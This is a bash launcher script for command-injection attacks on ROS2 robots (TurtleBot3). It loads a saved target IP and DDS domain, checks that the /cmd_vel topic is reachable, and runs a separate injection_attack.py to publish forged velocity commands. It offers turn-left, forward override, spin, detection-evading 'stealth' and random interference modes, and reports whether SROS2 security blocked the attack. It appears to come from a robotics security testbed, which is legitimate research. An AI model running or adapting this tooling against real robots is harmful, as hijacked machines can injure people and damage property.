#!/bin/bash
# Interactive attack launcher - choose attack type and parameters
# Works with both secure and non-secure ROS2 systems

echo "=========================================="
echo "Interactive Attack Launcher"
echo "=========================================="
echo ""

# Setup ROS2 environment
if [ -z "$ROS_DISTRO" ]; then
    source /opt/ros/jazzy/setup.bash 2>/dev/null || source /opt/ros/humble/setup.bash 2>/dev/null
fi
export TURTLEBOT3_MODEL=burger

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NETWORK_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# Load saved configuration if exists
if [ -f "$NETWORK_DIR/target_ip.txt" ]; then
    target_ip=$(cat "$NETWORK_DIR/target_ip.txt")
    domain_id=$(cat "$NETWORK_DIR/target_domain_id.txt" 2>/dev/null || echo "0")
    export ROS_DOMAIN_ID=$domain_id
    
    # Load DDS config if exists
    if [ -f "$NETWORK_DIR/dds_attack_config.xml" ]; then
        export CYCLONEDDS_URI=file://$NETWORK_DIR/dds_attack_config.xml
    fi
    
    echo "Target: $target_ip (Domain ID: $domain_id)"
    echo ""
fi

# Check if using SROS2 security
USE_SECURITY=false
if [ -n "$ROS_SECURITY_KEYSTORE" ] && [ -n "$ROS_SECURITY_ENABLE" ]; then
    USE_SECURITY=true
    echo "⚠️  SROS2 Security Mode Detected"
    echo "   Keystore: $ROS_SECURITY_KEYSTORE"
    echo "   Note: Attack will only work if you have valid credentials"
    echo ""
fi

# Verify connection
echo "Verifying connection to target..."
if ros2 topic list 2>/dev/null | grep -q cmd_vel; then
    echo "✅ Target reachable - /cmd_vel topic found"
else
    echo "⚠️  Warning: /cmd_vel topic not found"
    echo "   Target may not be running, or security is blocking access"
    read -p "Continue anyway? [y/N]: " continue_anyway
    if [ "$continue_anyway" != "y" ]; then
        exit 1
    fi
fi
echo ""

# Attack type selection
echo "Select attack type:"
echo "  1) Turn Left (default) - Forces robot to turn left"
echo "  2) Override - Forces robot to move forward"
echo "  3) Spin - Makes robot spin rapidly"
echo "  4) Stealth - Lower frequency attack (harder to detect)"
echo "  5) Interference - Random commands to disrupt control"
echo "  6) Custom - Set all parameters manually"
echo ""

read -p "Enter choice [1-6]: " attack_choice

case $attack_choice in
    1)
        ATTACK_TYPE="turn_left"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--angular-speed 0.5"
        ATTACK_DESC="Turn left attack"
        ;;
    2)
        ATTACK_TYPE="override"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--speed 0.5"
        ATTACK_DESC="Override attack (forward)"
        ;;
    3)
        ATTACK_TYPE="spin"
        ATTACK_FREQ=30
        ATTACK_DURATION=10
        EXTRA_ARGS="--angular-speed 2.0"
        ATTACK_DESC="Spin attack"
        ;;
    4)
        ATTACK_TYPE="stealth"
        ATTACK_FREQ=25
        ATTACK_DURATION=30
        EXTRA_ARGS="--speed 0.3"
        ATTACK_DESC="Stealth attack"
        ;;
    5)
        ATTACK_TYPE="interference"
        ATTACK_FREQ=40
        ATTACK_DURATION=30
        EXTRA_ARGS=""
        ATTACK_DESC="Interference attack (random)"
        ;;
    6)
        read -p "Attack type (turn_left/override/spin/stealth/interference): " ATTACK_TYPE
        read -p "Frequency (Hz, default 50): " ATTACK_FREQ
        ATTACK_FREQ=${ATTACK_FREQ:-50}
        read -p "Duration (seconds, default 15): " ATTACK_DURATION
        ATTACK_DURATION=${ATTACK_DURATION:-15}
        
        if [ "$ATTACK_TYPE" = "turn_left" ] || [ "$ATTACK_TYPE" = "spin" ]; then
            read -p "Angular speed (rad/s, default 0.5): " angular_speed
            angular_speed=${angular_speed:-0.5}
            EXTRA_ARGS="--angular-speed $angular_speed"
        else
            read -p "Speed (m/s, default 0.5): " speed
            speed=${speed:-0.5}
            EXTRA_ARGS="--speed $speed"
        fi
        ATTACK_DESC="Custom attack"
        ;;
    *)
        ATTACK_TYPE="turn_left"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--angular-speed 0.5"
        ATTACK_DESC="Turn left attack (default)"
        ;;
esac

echo ""
echo "=========================================="
echo "Attack Configuration"
echo "=========================================="
echo "Type: $ATTACK_DESC"
echo "Attack: $ATTACK_TYPE"
echo "Frequency: $ATTACK_FREQ Hz"
echo "Duration: $ATTACK_DURATION seconds"
if [ "$USE_SECURITY" = "true" ]; then
    echo "Security: Enabled (SROS2)"
else
    echo "Security: Disabled"
fi
echo ""

read -p "Confirm and launch attack? [Y/n]: " confirm
if [ "$confirm" = "n" ]; then
    echo "Attack cancelled"
    exit 0
fi

echo ""
echo "=========================================="
echo "Launching Attack!"
echo "=========================================="
echo ""

# Get path to injection_attack.py
INJECTION_SCRIPT="$(cd "$SCRIPT_DIR/../../scripts" && pwd)/injection_attack.py"

if [ ! -f "$INJECTION_SCRIPT" ]; then
    echo "Error: injection_attack.py not found at $INJECTION_SCRIPT"
    exit 1
fi

# Launch attack
echo "Starting attack in 2 seconds..."
sleep 2
echo ""

python3 "$INJECTION_SCRIPT" \
    --attack-type "$ATTACK_TYPE" \
    --frequency "$ATTACK_FREQ" \
    --duration "$ATTACK_DURATION" \
    --node-name "network_attacker" \
    $EXTRA_ARGS

ATTACK_EXIT_CODE=$?

echo ""
echo "=========================================="
if [ $ATTACK_EXIT_CODE -eq 0 ]; then
    echo "Attack Completed!"
else
    echo "Attack Failed (exit code: $ATTACK_EXIT_CODE)"
    echo ""
    if [ "$USE_SECURITY" = "true" ]; then
        echo "Possible reasons:"
        echo "  - No valid security credentials"
        echo "  - Security policy blocks this node"
        echo "  - Target not reachable with current credentials"
    else
        echo "Possible reasons:"
        echo "  - Target not running"
        echo "  - Network connection issue"
        echo "  - ROS_DOMAIN_ID mismatch"
    fi
fi
echo "=========================================="

